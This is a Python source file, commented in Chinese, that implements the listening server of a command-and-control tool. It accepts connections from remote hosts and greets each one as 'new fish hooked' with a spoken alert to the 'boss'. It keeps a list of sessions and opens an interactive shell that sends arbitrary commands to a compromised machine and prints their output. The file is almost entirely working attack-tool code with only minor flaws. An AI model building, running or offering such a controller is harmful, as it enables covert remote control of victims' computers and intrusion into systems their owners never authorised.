# 监听,发送命令,接收命令回显
import os
import socket
import struct
import threading

import pyttsx3
import settings


def recv_data(conn, buf_size=1024):
    """
    解决粘包的接收数据函数
    :param conn: sock对象
    :param buf_size: buf_size=1024
    :return: data bytes类型
    """
    # 先接受命令执行结果的长度
    x = conn.recv(4)
    all_size = struct.unpack('i', x)[0]
    # 解密(all_size)
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += conn.recv(buf_size)
        # data = 解密(data)
        recv_size += buf_size
    return data


def send_data(conn, data):
    """
    发送数据函数 , 解决粘包问题
    :param conn: sock
    :param data: data/cmd
    :return: None
    """
    if not data: return
    # 新增发送命令的粘包解决方案
    # 计算命令长度 , 打包发送
    cmd_len = struct.pack('i', len(data))
    conn.send(cmd_len)
    # 发送命令
    if type(data) == str:  # 注意 str 不需要单引号
        data = data.encode("utf-8")
    # data = 加密(data)
    conn.send(data)  # utf-8编码发送 ,类型是字节
    return
    # res_data = recv_data(conn)
    # print(res_data.decode('gbk'))


def change_prompt(sign):
    global num, prompt
    num = num + 1 if sign == "+" else num - 1
    prompt = f"[-][{num}-sessions]"


def accept_connections(sock):
    while 1:
        try:
            if stop_flag:
                break
            conn, addr = sock.accept()
            change_prompt("+")
            print(f"新鱼上钩, 地址: {addr}")
            engine = pyttsx3.init()
            engine.say("老大,你有新的主机上线")
            engine.runAndWait()
            sessions.append([conn, addr])
        except Exception:
            pass


def print_help():
    print('''
        Command and Control (C2) 

        sessions                          显示存活的session回话
        session -i *session id*           进入指定回话的shell,输入quite退出shell
        kill *session id*                 退出指定回话
        help                              打印帮助信息
        clear                             清空屏幕
        exit                              退出c2并关闭所有回话
        ''')


def shell_session(current_session):
    # 通过current_session获取conn和addr
    conn, addr = current_session
    while 1:
        try:
            # 先接收对方的os
            cmd = input(f'{addr}>').strip()
            if not cmd: continue
            if cmd.lower() in ["quit", "exit"]: return
            # 发送数据
            send_data(conn, cmd)
            # 接收结构
            res_data = recv_data(conn)
            print(res_data.decode("utf-8"))
        except KeyboardInterrupt:
            pass
        except Exception:
            conn.close()
            print(f"{addr} 异常退出")
            # session 死了,从session列表中删除
            sessions.remove(current_session)
            return


def main():
    # 1.建立socket对象
    sock = socket.socket()
    # 2.绑定地址
    sock.bind((settings.SERVER_LISTEN_IP, settings.SERVER_LISTEN_PORT))
    # 3.监听
    sock.listen(settings.SERVER_LISTEN_NUM)
    # 4.等待链接
    # 开启一个子线程,死循环接收用户的发起链接的请求
    # 创建线程接收半连接
    print("[-]等待链接...")
    t1 = threading.Thread(target=accept_connections, args=(sock,))
    # 开启线程
    t1.start()
    # 思路
    # 1.小菜单
    global prompt
    while 1:
        order = input(f"{prompt}>").strip()
        if not order: continue
        if order.lower() == "help":
            # 打印小菜单帮助信息
            print_help()
        elif order == "sessions":
            if not sessions:
                print("[-]当前sessions为空")
            # 打印当前存活的session
            for i, v in enumerate(sessions):
                print(f"{i + 1} {v[1]}")
        elif order[:12] == 'sessions -i ':
            # 进入指定的回话,然后执行命令
            num = order[12:]
            # 判断序号是否是数字,以及是否存在
            if num.isdigit() and 0 < int(num) <= len(sessions):
                # 存在num , 进入到 执行命令
                # 通过num获取当前的conn
                current_session = sessions[int(num) - 1]
                shell_session(current_session)

            else:
                print("请输入存在的 session id")
        elif order == "clear":
            cmd = "cls" if os.name == "nt" else "clear"
            os.system(cmd)
        elif order[:5] == "kill ":
            num = order[5:]
            if num.isdigit() and 0 < int(num) <= len(sessions):
                current_session = sessions[int(num) - 1]
                conn, addr = current_session
                # 直接发送一个exit命令
                send_data(conn, 'exit')
                conn.close()
                sessions.remove(current_session)
                print(f"[+] {addr} is killed")
                change_prompt("-")
            else:
                print("请输入存在的 session id")
        elif order == "exit":
            # 关闭所有的session
            for session in sessions:
                conn, addr = session
                # 直接发送一个exit命令
                send_data(conn, 'exit')
                conn.close()
                sessions.remove(session)
            print(f"[+]all session is killed and exit")
            # 把子线程结束掉
            sock.close()
            global stop_flag
            stop_flag = True
            t1.join()
            break
        else:
            print("[-]输入的指令不存在 , help查看全部指令")


if __name__ == '__main__':
    sessions = []
    stop_flag = False
    num = 0
    prompt = f"[-][{num}-sessions]"
    main()
